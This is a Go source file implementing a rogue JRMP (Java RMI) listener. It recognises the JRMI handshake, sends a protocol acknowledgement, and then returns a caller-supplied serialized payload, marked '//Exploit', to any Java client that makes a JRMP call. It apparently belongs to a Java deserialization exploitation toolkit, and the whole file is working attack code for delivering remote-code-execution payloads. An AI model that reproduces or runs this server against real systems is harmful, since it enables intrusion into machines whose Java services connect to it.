package rmi

import (
	"fmt"
	"github.com/op/go-logging"
	"net"
)

type Server struct {
	Host        string
	Port        int
	sk          net.Listener
	logger      *logging.Logger
	payload     []byte
	stoppedChan chan bool
}

func New(host string, port int, logger *logging.Logger, payload []byte) *Server {
	return &Server{
		Host:    host,
		Port:    port,
		logger:  logger,
		payload: payload,
	}
}

func (s *Server) setPayload(payload []byte) {
	s.payload = payload
}

func (s *Server) Start() error {
	addr := fmt.Sprintf("%s:%d", s.Host, s.Port)
	var err error
	s.sk, err = net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	s.logger.Debugf("JRMP listener start listen at %s", s.sk.Addr().String())

	s.stoppedChan = make(chan bool, 1)

	go s.onMessage()

	return nil
}

func (s *Server) Stop() {
	s.stoppedChan <- true
}

func (s *Server) onMessage() {
	defer func() {
		s.sk.Close()
	}()

	for {
		select {
		case <-s.stoppedChan:
			s.logger.Infof("JRMP Listener stopped")
			break
		default:
			conn, err := s.sk.Accept()
			if err != nil {
				s.logger.Errorf("Accept failed: %+v", err)
				break
			}
			buf := make([]byte, 1024)
			_, err = conn.Read(buf)
			if err != nil {
				s.logger.Error("accept data reading err: %s", err)
				_ = conn.Close()
				return
			}

			if !checkRMI(buf) {
				_ = conn.Close()
				continue
			}

			//Response 1
			data := []byte{
				0x4e, 0x00, 0x09, 0x31, 0x32,
				0x37, 0x2e, 0x30, 0x2e, 0x30,
				0x2e, 0x31, 0x00, 0x00, 0xc4, 0x12,
			}

			_, _ = conn.Write(data)
			_, _ = conn.Read(buf)

			s.logger.Infof("receive JRMP CALL request from %s", conn.RemoteAddr())

			_, _ = conn.Read(buf)
			//Exploit
			_, _ = conn.Write(append([]byte{0x51}, s.payload...))

			_, _ = conn.Read(buf)

			_ = conn.Close()
		}
	}
}

// RMI Protocol Docs:
// https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html
func checkRMI(data []byte) bool {
	if data[0] == 0x4a &&
		data[1] == 0x52 &&
		data[2] == 0x4d &&
		data[3] == 0x49 {
		if data[4] != 0x00 {
			return false
		}
		if data[5] != 0x01 && data[5] != 0x02 {
			return false
		}
		if data[6] != 0x4b &&
			data[6] != 0x4c &&
			data[6] != 0x4d {
			return false
		}
		lastData := data[7:]
		for _, v := range lastData {
			if v != 0x00 {
				return false
			}
		}
		return true
	}
	return false
}
